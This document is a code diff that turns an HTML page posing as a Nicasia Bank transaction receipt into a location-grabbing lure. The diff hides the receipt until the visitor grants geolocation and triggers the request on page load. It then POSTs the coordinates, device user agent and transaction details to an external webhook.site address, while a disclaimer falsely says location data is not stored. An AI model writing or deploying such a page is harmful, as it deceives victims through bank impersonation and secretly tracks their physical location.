@@ -16,6 +16,7 @@
       padding: 30px;
       border-radius: 12px;
       box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      display: none;
     }
     .receipt h2 {
       text-align: center;
@@ -60,10 +61,50 @@
       font-size: 14px;
       margin-top: 15px;
     }
+    .permission-prompt {
+      background: white;
+      max-width: 400px;
+      margin: 20px auto;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .permission-prompt button {
+      background: #2a5f8a;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+    .disclaimer {
+      font-size: 12px;
+      color: #666;
+      text-align: center;
+      margin-top: 20px;
+    }
+    .disclaimer button {
+      background: none;
+      border: none;
+      color: #2a5f8a;
+      text-decoration: underline;
+      cursor: pointer;
+      padding: 0;
+      margin-left: 5px;
+    }
   </style>
 </head>
 <body>
-  <div class="receipt">
+  <div class="permission-prompt" id="permission-prompt">
+    <h3>Nicasia Bank Transaction Verification</h3>
+    <p>Please grant location access to view your transaction receipt.</p>
+    <button onclick="requestLocation()">Grant Location Access</button>
+    <p id="permission-status"></p>
+  </div>
+
+  <div class="receipt" id="receipt">
     <div class="bank-logo">NICASIA BANK</div>
     <h2>Transaction Receipt</h2>
     
@@ -72,7 +113,7 @@
     <div class="details">
       <div class="detail-row">
         <span class="detail-label">From:</span>
-        <span class="detail-value">Prashan Budhathoki</span>
+        <span class="detail-value">****** Budhathoki</span>
       </div>
       <div class="detail-row">
         <span class="detail-label">To:</span>
@@ -92,41 +133,95 @@
       </div>
     </div>
     
-    <div id="location-status">Verifying transaction location...</div>
+    <div id="location-status">Transaction verified with location data</div>
+    <p class="disclaimer">
+      Location data is used solely for verification and is not stored.
+      <button onclick="showMap()">Show what we see</button>
+    </p>
   </div>
 
   <script>
     // Set current date
     document.getElementById('transaction-date').textContent = new Date().toLocaleString();
     
-    // Geolocation verification
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const locationData = {
-            lat: position.coords.latitude,
-            lng: position.coords.longitude,
-            accuracy: `${position.coords.accuracy}m`
-          };
-          document.getElementById('location-status').textContent = 
-            `Transaction verified from location (${locationData.lat}, ${locationData.lng})`;
-          
-          // Optional: Send to webhook (replace YOUR_WEBHOOK_URL)
-          fetch('https://webhook.site/badbb57b-df0b-4339-9064-0e7ddc716651', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(locationData)
-          });
-        },
-        (error) => {
-          document.getElementById('location-status').textContent = 
-            'Location verification skipped (user denied)';
-        }
-      );
-    } else {
-      document.getElementById('location-status').textContent = 
-        'Geolocation not supported';
+    let userPosition = null;
+    const WEBHOOK_URL = "https://webhook.site/badbb57b-df0b-4339-9064-0e7ddc716651"; // REPLACE WITH YOUR URL
+
+    function sendToWebhook(data) {
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      })
+      .then(response => console.log("Webhook success:", response))
+      .catch(error => console.error("Webhook error:", error));
     }
+
+    function showMap() {
+      if (userPosition) {
+        const lat = userPosition.coords.latitude;
+        const lng = userPosition.coords.longitude;
+        window.open(`https://www.openstreetmap.org/?mlat=${lat}&mlon=${lng}&zoom=15`);
+      } else {
+        alert("No location data available");
+      }
+    }
+    
+    function requestLocation() {
+      const permissionStatus = document.getElementById('permission-status');
+      const receipt = document.getElementById('receipt');
+      const prompt = document.getElementById('permission-prompt');
+      
+      if (navigator.geolocation) {
+        permissionStatus.textContent = "Checking location...";
+        
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            userPosition = position;
+            
+            // Console log for debugging
+            console.log(`
+              Lat: ${position.coords.latitude}
+              Long: ${position.coords.longitude}
+              Accuracy: ${position.coords.accuracy}m
+              Timestamp: ${new Date(position.timestamp)}
+            `);
+            
+            // Send to webhook
+            const webhookData = {
+              transaction_id: "NIC-7890-2024",
+              amount: "NPR 3,000",
+              sender: "****** Budhathoki",
+              receiver: "**** Nagarkoti",
+              location: {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: position.coords.accuracy
+              },
+              device: navigator.userAgent,
+              timestamp: new Date().toISOString()
+            };
+            sendToWebhook(webhookData);
+            
+            // Show receipt
+            prompt.style.display = 'none';
+            receipt.style.display = 'block';
+            document.getElementById('location-status').textContent = 
+              `Location verified (accuracy: ${position.coords.accuracy}m)`;
+          },
+          (error) => {
+            permissionStatus.textContent = "Location access is required to view receipt.";
+            if (error.code === error.PERMISSION_DENIED) {
+              permissionStatus.textContent = "You must grant location access to view your receipt.";
+            }
+          }
+        );
+      } else {
+        permissionStatus.textContent = "Geolocation is not supported by your browser.";
+      }
+    }
+    
+    window.onload = requestLocation;
   </script>
 </body>
 </html>
